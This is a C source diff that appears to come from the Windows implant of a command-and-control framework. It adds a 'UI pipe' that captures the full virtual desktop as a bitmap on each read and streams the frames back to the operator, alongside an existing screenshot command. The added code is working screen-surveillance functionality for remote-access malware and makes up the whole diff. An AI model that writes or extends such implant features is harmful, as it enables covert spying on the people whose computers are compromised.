@@ -40,6 +40,11 @@
                        UI_BASE, \
                        API_CALL)
 
+#define UI_PIPE \
+        TLV_PIPE_CUSTOM(PIPE_STATIC, \
+                        UI_BASE, \
+                        PIPE_TYPE)
+
 static int bmp_to_buffer(HBITMAP hBitmap, HDC hDC, unsigned char **out, size_t *out_size)
 {
     BITMAP bmp;
@@ -182,6 +187,95 @@ static tlv_pkt_t *ui_screenshot(c2_t *c2)
 void register_ui_api_calls(api_calls_t **api_calls)
 {
     api_call_register(api_calls, UI_SCREENSHOT, ui_screenshot);
+}
+
+static int ui_pipe_create(pipe_t *pipe, c2_t *c2)
+{
+    /* Nothing to initialise – each read captures a fresh frame */
+    pipe->data = NULL;
+    return 0;
+}
+
+static int ui_pipe_readall(pipe_t *pipe, void **buffer)
+{
+    HDC hScreenDC;
+    HDC hMemoryDC;
+    HBITMAP hBitmap;
+    HBITMAP hOldBitmap;
+    int width, height;
+    unsigned char *bmp_data;
+    size_t bmp_size;
+
+    hScreenDC = GetDC(NULL);
+    if (hScreenDC == NULL)
+    {
+        return -1;
+    }
+
+    hMemoryDC = CreateCompatibleDC(hScreenDC);
+    if (hMemoryDC == NULL)
+    {
+        ReleaseDC(NULL, hScreenDC);
+        return -1;
+    }
+
+    width = GetSystemMetrics(SM_CXVIRTUALSCREEN);
+    height = GetSystemMetrics(SM_CYVIRTUALSCREEN);
+
+    if (width == 0 || height == 0)
+    {
+        width = GetDeviceCaps(hScreenDC, HORZRES);
+        height = GetDeviceCaps(hScreenDC, VERTRES);
+    }
+
+    hBitmap = CreateCompatibleBitmap(hScreenDC, width, height);
+    if (hBitmap == NULL)
+    {
+        DeleteDC(hMemoryDC);
+        ReleaseDC(NULL, hScreenDC);
+        return -1;
+    }
+
+    hOldBitmap = (HBITMAP)SelectObject(hMemoryDC, hBitmap);
+    BitBlt(hMemoryDC, 0, 0, width, height,
+           hScreenDC, GetSystemMetrics(SM_XVIRTUALSCREEN),
+           GetSystemMetrics(SM_YVIRTUALSCREEN), SRCCOPY);
+    SelectObject(hMemoryDC, hOldBitmap);
+
+    bmp_data = NULL;
+    bmp_size = 0;
+
+    if (bmp_to_buffer(hBitmap, hMemoryDC, &bmp_data, &bmp_size) != 0 || bmp_data == NULL)
+    {
+        DeleteObject(hBitmap);
+        DeleteDC(hMemoryDC);
+        ReleaseDC(NULL, hScreenDC);
+        return -1;
+    }
+
+    DeleteObject(hBitmap);
+    DeleteDC(hMemoryDC);
+    ReleaseDC(NULL, hScreenDC);
+
+    *buffer = bmp_data;
+    return (int)bmp_size;
+}
+
+static int ui_pipe_destroy(pipe_t *pipe, c2_t *c2)
+{
+    return 0;
+}
+
+void register_ui_api_pipes(pipes_t **pipes)
+{
+    pipe_callbacks_t callbacks;
+
+    memset(&callbacks, 0, sizeof(callbacks));
+    callbacks.create_cb = ui_pipe_create;
+    callbacks.readall_cb = ui_pipe_readall;
+    callbacks.destroy_cb = ui_pipe_destroy;
+
+    api_pipe_register(pipes, UI_PIPE, callbacks);
 }
 
 #endif
